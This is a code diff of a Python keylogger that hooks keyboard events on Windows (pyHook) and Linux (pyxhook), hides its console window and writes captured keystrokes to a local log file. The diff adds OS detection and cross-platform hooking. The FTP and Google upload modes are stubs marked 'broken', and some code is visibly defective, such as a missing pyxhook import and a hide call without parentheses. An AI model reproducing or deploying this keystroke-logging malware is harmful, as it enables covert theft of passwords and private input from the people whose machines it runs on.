@@ -1,10 +1,26 @@
 import pyHook, pythoncom, time, click, win32console, win32gui
+from sys import platform
 
-
+'''
 @click.command()
 @click.option('--file', '-f', default="c:\\temp\logfile.txt", help="File to output keystrokes to (if running local), "
                                                                    "defaults to c:\\temp\\logfile.txt")
 @click.option('--mode', '-m', default="local", help="Where to send log, defaults to local, options are local, ftp, ")
+'''
+
+def check_os():
+    if platform == "linux" or platform == "linux2":
+        print('OS: Linux')
+        return 'linux'
+    elif platform == "darwin":
+        print('OS: Mac')
+        return 'mac'
+    elif platform == "win32":
+        print('OS: Windows')
+        return 'windows'
+    else:
+        print('OS: Unknown')
+        return 'unknown'
 
 
 def hide():
@@ -30,7 +46,12 @@ def main():
     hide
     global data
     data = ''
+    global mode
+    mode = 'local'
+    global file
+    file = "c:\\temp\logfile.txt"
     return True
+
 
 def local():
     global data, file
@@ -45,17 +66,18 @@ def local():
             data = ''
     return True
 
+
 def ftp():
     print('FTP broken')
     pass
+
 
 def google():
     print('Google broken')
     pass
 
-if __name__ == '__main__':
-    main()
 
+# windows event catch
 def on_keyboard_event(event):
     global mode, data
     if event.Key == "Return":
@@ -75,9 +97,36 @@ def on_keyboard_event(event):
         google()
     return True
 
-hooks_manager = pyHook.HookManager()
-hooks_manager.KeyDown = on_keyboard_event
-hooks_manager.HookKeyboard()
-pythoncom.PumpMessages()
+#hide()
+#data = ''
 
 
+if __name__ == '__main__':
+    main()
+
+
+if check_os() == 'linux':
+    # Linux
+    # instantiate HookManager class
+    new_hook = pyxhook.HookManager()
+    # listen to all keystrokes
+    new_hook.KeyDown = on_keyboard_event
+    # hook the keyboard
+    new_hook.HookKeyboard()
+    # start the session
+    new_hook.start()
+    click.echo('Linux')
+
+elif check_os() == 'windows':
+    # Windows
+    hooks_manager = pyHook.HookManager()
+    hooks_manager.KeyDown = on_keyboard_event
+    hooks_manager.HookKeyboard()
+    pythoncom.PumpMessages()
+    click.echo('Windows')
+elif check_os() == 'mac':
+    click.echo('Mac')
+    pass
+elif check_os() == 'unknown':
+    click.echo('Unknwon')
+    pass
